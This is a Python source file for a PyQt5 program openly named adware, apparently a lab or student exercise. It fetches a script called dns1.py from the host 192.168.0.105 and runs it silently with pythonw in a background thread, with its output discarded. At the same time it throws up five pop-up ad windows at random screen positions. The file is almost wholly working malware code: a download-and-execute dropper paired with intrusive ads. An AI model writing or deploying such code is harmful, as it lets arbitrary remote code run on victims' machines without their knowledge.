import os
import urllib.request
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QDialog
from PyQt5.QtGui import QPixmap
from PyQt5.QtCore import QTimer, QObject, pyqtSignal
import random
import subprocess
from threading import Thread, Lock


class AdwareManager(QObject):
    show_ad_signal = pyqtSignal()  

    def __init__(self, app, ads_to_show):
        super().__init__()
        self.app = app
        self.ads_to_show = ads_to_show
        self.show_ad_signal.connect(self._create_ad_window)  

        self.windows = []  
        self.lock = Lock()

        self.ad_image_urls = [
        "https://www.menutiger.com/_next/image?url=http%3A%2F%2Fcms.menutiger.com%2Fwp-content%2Fuploads%2F2024%2F06%2Fqr-code-for-food-advertisements.webp&w=1080&q=75",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS_W3E3W2BROvWhDqmFspoObA-pWPqi3o8sfQ&s",
        "https://images.shiksha.com/mediadata/ugcDocuments/images/wordpressImages/2022_06_adware.jpg"
        ]

        self.ad_image_files = []

    def download_code_and_files(self):
        try:
            print("Downloading the Python code...")

            urllib.request.urlretrieve("http://192.168.0.105/dns1.py", "dns1.py")
            print("DNS script downloaded: dns1.py")


        except Exception as e:
            print(f"Error downloading files: {e}")

    def download_ad_images(self):
        try:
            for idx, url in enumerate(self.ad_image_urls):
                filename = f"ad_image_{idx}.png"
                print(f"Downloading ad image from {url}...")
                urllib.request.urlretrieve(url, filename)
                self.ad_image_files.append(filename)  
                print(f"Ad image downloaded: {filename}")
        except Exception as e:
            print(f"Error downloading ad images: {e}")

    def show_adware_windows(self):
        for _ in range(self.ads_to_show):
            QTimer.singleShot(0, lambda: self.show_ad_signal.emit())  

    def _create_ad_window(self):
        print("Creating ad window...") 

        dialog = QDialog()
        dialog.setWindowTitle("Adware - Promotional Message")

        random_image_file = random.choice(self.ad_image_files)

        label = QLabel()
        label.setStyleSheet("font-size: 14px; font-weight: bold; margin-bottom: 10px;")

        layout = QVBoxLayout()
        layout.addWidget(label)

        image_label = QLabel()
        pixmap = QPixmap(random_image_file)
        if not pixmap.isNull():
            scaled_pixmap = pixmap.scaled(400, 300, aspectRatioMode=1)
            image_label.setPixmap(scaled_pixmap)
        else:
            print(f"Image {random_image_file} not loaded.")
        layout.addWidget(image_label)

        dialog.setLayout(layout)

        screen_width, screen_height = QApplication.primaryScreen().size().width(), QApplication.primaryScreen().size().height()
        random_x = random.randint(0, max(0, screen_width - 400))
        random_y = random.randint(0, max(0, screen_height - 300))
        dialog.move(random_x, random_y)

        dialog.exec_()
        self.windows.append(dialog)  

    def execute_downloaded_script(self):
        try:
            print("Executing downloaded DNS script...")

            subprocess.run(
                ["pythonw", "dns1.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            print("Downloaded DNS script executed.")
        except Exception as e:
            print(f"Error executing script: {e}")

    def execute_ads_and_code_simultaneously(self):
        code_execution_thread = Thread(target=self.execute_downloaded_script, daemon=True)
        code_execution_thread.start()

        self.show_adware_windows()


def main():
    app = QApplication([])

    ad_manager = AdwareManager(app, ads_to_show=5)

    # Start the thread to download code and files
    download_code_thread = Thread(target=ad_manager.download_code_and_files, daemon=True)
    download_code_thread.start()

    # Start the thread to download ad images
    download_images_thread = Thread(target=ad_manager.download_ad_images, daemon=True)
    download_images_thread.start()

    # Wait for the download threads to finish
    download_code_thread.join()
    download_images_thread.join()

    # Execute the ads and DNS script simultaneously
    ad_manager.execute_ads_and_code_simultaneously()

    app.exec_()


if __name__ == "__main__":
    main()
